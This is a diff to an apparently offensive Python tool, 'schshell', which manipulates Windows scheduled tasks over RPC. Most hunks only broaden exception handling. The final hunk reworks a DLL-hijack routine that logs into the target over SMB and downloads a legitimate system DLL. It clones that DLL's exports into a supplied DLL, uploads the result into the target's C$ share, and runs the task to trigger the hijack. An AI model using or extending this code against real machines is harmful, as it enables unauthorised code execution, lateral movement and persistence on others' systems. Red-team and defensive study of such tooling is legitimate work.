@@ -7,6 +7,7 @@ from schshell import OBJ_EXTRA_FMT, ColorScheme, console
 from schshell.lib.xmlhandler import XMLHandler
 from schshell.lib.models import Principal, DLLHijack, DLL_HIJACKS
 from schshell.lib.pyclone import _clone_exports
+from hashlib import sha256
 from rich import print_json
 from io import BufferedReader
 from os import remove
@@ -166,7 +167,7 @@ class TaskHandler:
         try:
             resp = tsch.hSchRpcRun(self.__dce, self.__path, sessionId=session_id)
             logging.info(f'Task started: {ColorScheme.task}{self.__path}[/]', extra=OBJ_EXTRA_FMT)
-        except tsch.DCERPCSessionError as e:
+        except (tsch.DCERPCSessionError, tsch.DCERPCException) as e:
             if 'ERROR_FILE_NOT_FOUND' in str(e):
                 logging.error(f'ERROR_FILE_NOT_FOUND - Invalid task path')
             elif '0x80041326' in str(e):
@@ -184,7 +185,7 @@ class TaskHandler:
         try:
             resp = tsch.hSchRpcStop(self.__dce, self.__path)
             logging.info(f'Task stopped: {self.__path}')
-        except tsch.DCERPCSessionError as e:
+        except (tsch.DCERPCSessionError, tsch.DCERPCException) as e:
             if 'ERROR_FILE_NOT_FOUND' in str(e):
                 logging.error(f'ERROR_FILE_NOT_FOUND - Invalid task path')
             elif '0x80041326' in str(e):
@@ -219,7 +220,7 @@ class TaskHandler:
             for subfolder in resp['pNames']:
                 contents['subfolders'].append(subfolder['Data'][:-1])
             print_json(json.dumps(contents))
-        except tsch.DCERPCSessionError as e:
+        except (tsch.DCERPCSessionError, tsch.DCERPCException) as e:
             if 'ERROR_FILE_NOT_FOUND' in str(e):
                 logging.error(f'ERROR_FILE_NOT_FOUND - Invalid task path')
             else:
@@ -230,7 +231,7 @@ class TaskHandler:
     def _get_task_instances(self):
         try:
             resp = tsch.hSchRpcEnumInstances(self.__dce, self.__path)
-        except tsch.DCERPCSessionError as e:
+        except (tsch.DCERPCSessionError, tsch.DCERPCException) as e:
             if 'ERROR_FILE_NOT_FOUND' in str(e):
                 logging.error(f'ERROR_FILE_NOT_FOUND - Invalid task path')
             else:
@@ -245,7 +246,7 @@ class TaskHandler:
     def _get_task_state(self):
         try:
             resp = tsch.hSchRpcGetTaskInfo(self.__dce, self.__path)
-        except tsch.DCERPCSessionError as e:
+        except (tsch.DCERPCSessionError, tsch.DCERPCException) as e:
             if 'ERROR_FILE_NOT_FOUND' in str(e):
                 logging.error(f'ERROR_FILE_NOT_FOUND - Invalid task path')
             else:
@@ -319,7 +320,7 @@ class TaskHandler:
         try:
             resp = tsch.hSchRpcRegisterTask(self.__dce, self.__path, xml_handler.get_xml_as_string(), tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
             logging.info(f'Task created: {ColorScheme.task}{self.__path}[/]', extra=OBJ_EXTRA_FMT)
-        except tsch.DCERPCSessionError as e:
+        except (tsch.DCERPCSessionError, tsch.DCERPCException) as e:
             logging.error(str(e))
             exit()
 
@@ -330,7 +331,7 @@ class TaskHandler:
         try:
             resp = tsch.hSchRpcDelete(self.__dce, self.__path)
             logging.info(f'Task deleted: {ColorScheme.task}{self.__path}[/]', extra=OBJ_EXTRA_FMT)
-        except tsch.DCERPCSessionError as e:
+        except (tsch.DCERPCSessionError, tsch.DCERPCException) as e:
             if 'ERROR_FILE_NOT_FOUND' in str(e):
                 logging.error(f'ERROR_FILE_NOT_FOUND - Invalid task path')
             else:
@@ -365,36 +366,42 @@ class TaskHandler:
                 smb_conn.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
         except Exception as e:
             logging.error(e)
+            
 
-        #dll_bytes = dll.read()
-        dll_bytes = open(dll.name, 'rb').read()
+        try:
+            dll_bytes = dll.read()
+            #dll_bytes = open(dll.name, 'rb').read()
 
-        # if hijack has a reference DLL, download it
-        if hijack_info.reference:
-            smb_conn.getFile('C$', hijack_info.reference[3:], self._answer)
-            logging.debug(f'Downloaded legit {hijack_info.reference} from target')
+            # if hijack has a reference DLL, download it
+            if hijack_info.reference:
+                smb_conn.getFile('C$', hijack_info.reference[3:], self._answer)
+                logging.debug(f'Downloaded legit {hijack_info.reference} from target')
 
-            # from PyClone
-            target_pe = pefile.PE(data=dll_bytes)
-            reference_pe = pefile.PE(data=self.__reference_dll)
+                # from PyClone
+                target_pe = pefile.PE(data=dll_bytes)
+                reference_pe = pefile.PE(data=self.__reference_dll)
 
-            cloned_pe = _clone_exports(target_pe, reference_pe, hijack_info.reference, '.rdata2')
-            dll_bytes = cloned_pe.write()
-            logging.info(f'Cloned exports to provided dll')       
+                cloned_pe = _clone_exports(target_pe, reference_pe, hijack_info.reference, '.rdata2')
+                dll_bytes = cloned_pe.write()
+                logging.info(f'Cloned exports to provided dll')       
 
-        # this is ugly - write cloned dll or original dll to disk
-        # so we can use .read() as putFiles callback func
-        tmp_name = f'{dll.name}.tmp'
-        open(tmp_name, 'wb').write(dll_bytes)
-        fh = open(tmp_name, 'rb')     
+            # this is ugly - write cloned dll or original dll to disk
+            # so we can use .read() as putFiles callback func
+            tmp_name = f'{dll.name}.tmp'
+            open(tmp_name, 'wb').write(dll_bytes)
+            fh = open(tmp_name, 'rb')     
 
-        smb_conn.putFile('C$', hijack_info.path[3:], fh.read)
-        fh.close()
-        logging.info(f'Uploaded {dll.name} to {hijack_info.path}')
-        remove(tmp_name)
-        
-        # kick the task to trigger the hijack
-        self.run_task()
+            smb_conn.putFile('C$', hijack_info.path[3:], fh.read)
+            fh.close()
+            logging.info(f'Uploaded {dll.name} to {hijack_info.path}')
+            logging.debug(f'SHA256 of uploaded DLL: {sha256(dll_bytes).hexdigest()}')
+            remove(tmp_name)
+            
+            # kick the task to trigger the hijack
+            self.run_task()
+        except Exception as e:
+            logging.error(e)
+            smb_conn.close()
 
 
 # used for -enum-all
